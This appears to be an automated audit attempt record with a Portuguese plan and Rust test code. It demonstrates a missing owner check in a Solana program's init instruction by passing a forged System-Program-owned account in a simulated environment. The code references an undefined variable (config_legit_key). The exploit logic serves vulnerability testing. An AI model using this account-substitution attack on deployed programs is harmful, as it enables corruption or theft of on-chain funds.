attempts.raw:
{
  "plan": "O programa `init` (Pinocchio) escreve em `accounts[0]` sem verificar o owner. O baseline usa uma conta `config` cujo owner é o próprio programa-alvo, provando que o cenário está montado corretamente. O ataque repete a mesma instrução, mas substitui `config` por uma conta forjada cujo owner é o System Program (ou outro programa), mantendo a authority legítima. O efeito mede que os dados da conta forjada foram sobrescritos pelo programa, demonstrando que ele aceitou e escreveu em uma conta que não lhe pertence.",
  "scenario": "let authority = Pubkey::new_unique();

// Conta config legítima: dona do programa-alvo, com dados iniciais zerados.
let config_legit = account(&env.program_id, &[0u8; 64], None);

let metas_legit = vec![
    AccountMeta::new(config_legit_key, false),
    AccountMeta::new_readonly(authority, false),
];

let ix_legit = env.raw_ix(&[IX_INIT], metas_legit);

let contas_legit = vec![
    (config_legit_key, config_legit),
    (authority, wallet(1_000_000)),
];

let r_base = env.baseline("init legitimo em conta do programa", &ix_legit, &contas_legit);

// Conta forjada: owner diferente do programa-alvo (System Program).
let config_forjada_key = Pubkey::new_unique();
let config_forjada = account(&solana_sdk::system_program::id(), &[0u8; 64], None);

let metas_ataque = vec![
    AccountMeta::new(config_forjada_key, false),
    AccountMeta::new_readonly(authority, false),
];

let ix_ataque = env.raw_ix(&[IX_INIT], metas_ataque);

let contas_ataque = vec![
    (config_forjada_key, config_forjada),
    (authority, wallet(1_000_000)),
];

let r = env.attack("init em conta com owner alheio", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let dados = after(&r, &config_forjada_key).data();
    env.effect(
        "programa escreveu em conta de outro owner",
        read_u64(dados, 0) == 0x0807060504030201u64
            && read_pubkey(dados, 8) == authority
            && dados[40] == 1,
    );
}"
}

